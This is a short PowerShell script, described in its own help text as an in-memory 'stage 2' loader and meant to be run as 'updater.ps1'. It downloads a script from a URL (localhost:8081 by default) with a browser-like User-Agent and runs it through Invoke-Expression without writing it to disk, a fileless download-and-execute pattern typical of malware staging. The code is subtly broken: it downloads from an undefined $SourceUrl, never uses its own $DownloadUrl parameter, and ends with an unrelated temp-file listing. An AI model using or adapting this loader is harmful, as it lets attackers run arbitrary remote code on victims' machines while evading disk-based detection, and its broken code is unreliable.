<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$DownloadUrl = "https://localhost:8081/stage2.ps1",
    [int]$ConnectionTimeout = 51
)
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$StageScript = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($StageScript)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $StageScript.Length)
Invoke-Expression $StageScript

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
